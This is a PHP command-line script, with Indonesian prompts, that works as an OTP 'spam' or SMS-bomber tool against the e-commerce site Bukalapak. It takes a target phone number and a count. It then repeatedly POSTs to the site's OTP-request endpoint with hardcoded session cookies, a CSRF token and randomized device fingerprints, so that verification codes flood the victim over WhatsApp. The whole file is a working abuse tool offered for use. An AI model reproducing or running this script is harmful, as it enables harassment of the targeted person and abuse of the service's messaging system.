<?php

	error_reporting(0);

	echo "\n";
	echo " [!] Spam Kode Otentikasi (OTP) Bukalapak ";
	echo "\n\n";
	echo " [?] nomer (format 62xxx) => ";
	$nomer = trim(fgets(STDIN));
	echo " [?] jumlah sms => ";
	$jumlah = trim(fgets(STDIN));
	echo " [?] delay (dalam detik) => ";
	$delay = trim(fgets(STDIN));
	echo "\n";

	for( $i=0; $i<$jumlah; $i++) {

		$random_md5 = md5(uniqid(rand(), true));

		$headers = array(
			'Host: m.bukalapak.com',
			'Connection: keep-alive',
			'Content-Length: 134',
			'Origin: https://m.bukalapak.com',
			'X-CSRF-Token: uYUfi93g92mZboBVB4UMwYInorBNOgyYEAbPUTikHht+xseF8BFUgg9qSgQWA9MRy7eL8G/SnbYUGg0JRM1fjw==',
			'User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36',
			'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
			'Accept: */*',
			'X-Requested-With: XMLHttpRequest',
			'Save-Data: on',
			'Referer: https://m.bukalapak.com/register?from=home_mobile',
			'Accept-Encoding: gzip, deflate, br',
			'Accept-Language: en-US,en;q=0.9,id;q=0.8',
			'Cookie: identity='.$random_md5.'; browser_id='.$random_md5.'; _ga=GA1.2.1024758930.1531960985; _vwo_uuid_v2=DE8E70E7E9A8960F05F20FE0ACE87643B|378e4a2f30c36053c1cb833e89ecbc2e; _gid=GA1.2.622427606.1533988422; scs=%7B%22t%22%3A1%7D; spUID=15339884253603c43b2de12.c5b45553; session_id=e95e7511997432af179935abfce90320; __auc=3eed305416528d5f584187b45b2; G_ENABLED_IDPS=google; track_register=true; affiliate_landing_visit=true; mp_51467a440ff602e0c13d513c36387ea8_mixpanel=%7B%22distinct_id%22%3A%20%22164affd88ae1d-0791dbbd558a18-1f20130c-38400-164affd88aff4%22%2C%22utm_source%22%3A%20%22hasoffers-1851%22%2C%22utm_medium%22%3A%20%22affiliate%22%2C%22utm_campaign%22%3A%20%2215%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D; ins-gaSSId=cdd66ffd-18ce-a176-a3c3-26f0ac9ec000_1534027025; lskjfewjrh34ghj23brjh234=elBsSkNBb3VKS3hzZSttTnNKTm5VNk1pWmtzV1A1YldKRm1majAzRFdsSUJtcDJJV0psL0pnOFlBamtJU1NBa1Y2czlQdjZrNlFURDNiRmZqQmNRRXRyeWRTbGV5QUdpQnZjV3JocEc3ak9QeHpWSlpRNTE4eFgzR2FieDVnc2dWaUVoZzVzMEJlMVZwM2NKWk1LaXVwQTZuOXBVR01TUUJ4ejc4MW5MTU5taGYwZ2M0bFdwM05KYy9IcTh3bThsd3dzbSt4bHd4WG9NSklrcHJtT0dHUURURVQ5YVoyb0hLQ3dyUC9NZ2V6UUNFYmVGbE84REtqOHZlKzBZUGtiRS0tV3pMamNPNDhKT1FoZ202Q1BkNUJ5dz09--5a445aefe0c06b736c22e9f359ee3b7273058175; insdrSV=32; _td=7e03facb-a77c-4ce7-8b83-2427781c78c7'
		);
		
		$post_fields = http_build_query(
					array(
					'feature' => 'phone_registration',
					'feature_tag' => '',
					'manual_phone' => $nomer,
					'device_fingerprint' => $random_md5,
					'channel' => 'WhatsApp'
					)
		);

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://m.bukalapak.com/trusted_devices/otp_request");
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
		$output = curl_exec($ch);
		curl_close($ch);

		echo " [".($i+1)."/".$jumlah."] Ok Terkirim Gan ke => ".$nomer." .... delay dulu ".$delay." detik";
		echo "\n";

		sleep($delay);

	}

?>